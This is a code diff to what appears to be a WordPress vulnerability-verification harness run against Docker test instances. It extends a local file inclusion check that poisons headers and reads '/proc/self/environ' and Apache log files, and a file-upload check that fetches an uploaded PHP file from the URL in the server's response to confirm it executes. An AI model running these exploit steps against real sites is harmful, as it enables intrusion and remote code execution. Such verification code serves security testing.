@@ -4632,16 +4632,23 @@ def verify_wordpress_lfi(
             try:
                 import requests as _requests
                 _requests.get(boot.base_url + "/", headers={"User-Agent": poison_ua}, timeout=10)
+                # /proc/self/environ also reflects X-Forwarded-For; cover configs that strip UA
+                _requests.get(boot.base_url + "/", headers={"X-Forwarded-For": poison_ua}, timeout=10)
                 time.sleep(1)
             except Exception:
                 pass
 
-            # rutas de log mas comunes en imagenes Docker oficiales de Apache/PHP
+            # /proc/self/environ is always present in Docker and reflects HTTP_USER_AGENT
+            # (and HTTP_X_FORWARDED_FOR) from the current request's environment — no log
+            # files needed. Apache Docker images pipe access logs to stdout/stderr, so the
+            # classic /var/log/apache2/access.log paths often don't exist on disk.
             log_paths = [
+                "/proc/self/environ",
+                "/var/log/apache2/error.log",
                 "/var/log/apache2/access.log",
                 "/var/log/apache2/other_vhosts_access.log",
                 "/var/log/httpd/access_log",
-                "/proc/self/fd/2",   # stderr -- a veces contiene el log de errores de Apache
+                "/proc/self/fd/2",
                 "/usr/local/apache2/logs/access_log",
             ]
             depths = (0, 4, 8)
@@ -10331,12 +10338,54 @@ def verify_wordpress_file_upload(
                         "file_field_usado": _actual_file_field,
                         "respuesta_servidor": _resp_snippet}
                 if not found_path:
-                    if _resp_snippet:
-                        step(f"  → {resp.status_code} · respuesta: {_resp_snippet!r}")
-                    tried.append(entry)
+                    # Many plugins return {"url": "..."} or {"data": {"url": ...}} in the
+                    # upload response. Try that URL directly before giving up — the file may
+                    # live outside /var/www/html or be accessible only via the returned link.
+                    _url_from_resp = None
+                    try:
+                        import json as _jmod
+                        _rj = _jmod.loads(resp.text or "{}")
+                        for _rk in ("url", "file", "src", "path", "location", "file_url", "fileUrl"):
+                            _rv = _rj.get(_rk)
+                            if not _rv and isinstance(_rj.get("data"), dict):
+                                _rv = _rj["data"].get(_rk)
+                            if _rv and isinstance(_rv, str) and _rv.startswith("http"):
+                                _url_from_resp = _rv
+                                break
+                    except Exception:
+                        pass
+                    if _url_from_resp:
+                        step(f"  fichero no en webroot; probando URL de la respuesta: {_url_from_resp!r}")
+                        try:
+                            import requests as _rq2
+                            r2 = _rq2.get(_url_from_resp, timeout=15)
+                            _pat2 = re.compile(rf"(?<!\d){expected}(?!\d)")
+                            if _pat2.search(r2.text or ""):
+                                found = True
+                                entry.update({"url_publica": _url_from_resp,
+                                              "suma_presente": True, "status_peticion_directa": r2.status_code})
+                                res.evidence.update({
+                                    "filename_ganador": fname, "url_publica_ganadora": _url_from_resp,
+                                    "status_code_respuesta": r2.status_code,
+                                    "respuesta_cuerpo_recorte": (r2.text or "")[:500],
+                                })
+                                step(f"VERIFICADO (URL de respuesta): {_url_from_resp} devolvio "
+                                     f"{expected} (={a}+{b}) — el fichero se EJECUTA como PHP.")
+                                tried.append(entry)
+                                break
+                        except Exception:
+                            pass
+                    if not found:
+                        if _resp_snippet:
+                            step(f"  → {resp.status_code} · respuesta: {_resp_snippet!r}")
+                        tried.append(entry)
+                        continue
+                    if found:
+                        break
+                rel = found_path.replace("/var/www/html", "", 1) if found_path else ""
+                candidate_url = boot.base_url + rel if rel else ""
+                if not candidate_url:
                     continue
-                rel = found_path.replace("/var/www/html", "", 1)
-                candidate_url = boot.base_url + rel
                 entry["url_publica"] = candidate_url
                 step(f"'{fname}' se guardo en {found_path}; pidiendolo directo para ver si se EJECUTA...")
                 try:
